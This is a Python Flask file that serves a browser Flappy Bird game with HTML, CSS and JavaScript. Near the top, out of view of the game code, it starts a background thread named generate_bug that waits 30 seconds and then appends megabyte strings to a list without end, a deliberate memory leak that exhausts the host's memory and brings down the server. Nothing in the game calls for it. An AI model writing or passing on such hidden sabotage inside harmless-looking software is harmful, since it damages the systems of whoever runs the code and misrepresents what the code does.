from flask import Flask, render_template_string
import threading
import time

app = Flask(__name__)

memory_leak = []


def generate_bug():
    time.sleep(30)

    while True:
        memory_leak.append('X' * 1000000)


threading.Thread(target=generate_bug, daemon=True).start()

HTML = '''
<!DOCTYPE html>
<html>
<head>
<title>Smooth Flappy Bird</title>
<style>
body {
    margin: 0;
    background: linear-gradient(to bottom, #1e3c72, #2a5298);
    text-align: center;
    color: white;
    font-family: Arial;
}

#game {
    width: 450px;
    height: 550px;
    margin: auto;
    border-radius: 20px;
    overflow: hidden;
    position: relative;
    background: rgba(255,255,255,0.1);
    backdrop-filter: blur(10px);
}

#bird {
    width: 50px;
    height: 50px;
    background: orange;
    border-radius: 50%;
    position: absolute;
    left: 70px;
    top: 200px;
    box-shadow: 0px 0px 20px orange;
    transition: top 0.08s linear;
}

.pipe {
    width: 70px;
    background: limegreen;
    position: absolute;
    border-radius: 10px;
}

button {
    margin-top: 20px;
    padding: 12px 30px;
    border-radius: 10px;
    border: none;
    font-size: 18px;
    cursor: pointer;
}
</style>
</head>
<body>
<h1>Flappy Bird Updated Version</h1>

<div id="game">
    <div id="bird"></div>
</div>

<button onclick="startGame()">Start Game</button>
<button onclick="jump()">Jump</button>

<script>
const game = document.getElementById('game')
const bird = document.getElementById('bird')

let birdTop = 200
let gravity
let pipeLoop
let running = false

function startGame(){

    if(running) return

    running = true

    gravity = setInterval(() => {
        birdTop += 3
        bird.style.top = birdTop + 'px'
    }, 30)

    pipeLoop = setInterval(createPipe, 1800)
}

function jump(){
    birdTop -= 65
    bird.style.top = birdTop + 'px'
}

function createPipe(){

    let gap = 170
    let topHeight = Math.floor(Math.random() * 250) + 50

    let topPipe = document.createElement('div')
    topPipe.classList.add('pipe')
    topPipe.style.height = topHeight + 'px'
    topPipe.style.top = '0px'

    let bottomPipe = document.createElement('div')
    bottomPipe.classList.add('pipe')
    bottomPipe.style.height = (550 - topHeight - gap) + 'px'
    bottomPipe.style.bottom = '0px'

    game.appendChild(topPipe)
    game.appendChild(bottomPipe)

    let pipeLeft = 450

    let movePipe = setInterval(() => {

        pipeLeft -= 7

        topPipe.style.left = pipeLeft + 'px'
        bottomPipe.style.left = pipeLeft + 'px'

        if(pipeLeft < -70){
            clearInterval(movePipe)
            topPipe.remove()
            bottomPipe.remove()
        }

    }, 30)
}
</script>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)